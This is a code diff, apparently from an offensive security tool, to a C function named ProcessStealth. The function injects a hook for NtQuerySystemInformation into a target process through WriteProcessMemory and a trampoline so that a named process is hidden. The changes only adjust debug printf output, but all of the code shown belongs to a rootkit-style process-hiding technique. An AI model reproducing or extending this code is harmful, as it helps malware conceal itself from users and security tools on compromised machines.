@@ -70,7 +70,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 
     PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
 
-    printf("[*] NtQuerySystemInformation : %p\n", NtQuerySystemInformation);
+    printf("[*] NtQuerySystemInformation : 0x%p\n", NtQuerySystemInformation);
 
     if (hProcess == NULL)
     {
@@ -88,7 +88,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
-    printf("[*] Hook Function Address : %p\n", NewFunction);
+    printf("[*] Hook Function Address : 0x%p\n", NewFunction);
 
     memcpy(TrampolineCode + 2, &NewFunction, 8);
 
@@ -102,6 +102,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     }
 
     printf("[*] Write NewNtQuerySystemInformation\n");
+    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);
 
     DWORD SystemCallNumber = *(DWORD *)((ULONGLONG)NtQuerySystemInformation + 4);
 
@@ -130,6 +131,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     }
 
     printf("[*] Wrtie hide process name\n");
+    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);
 
     if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
     {
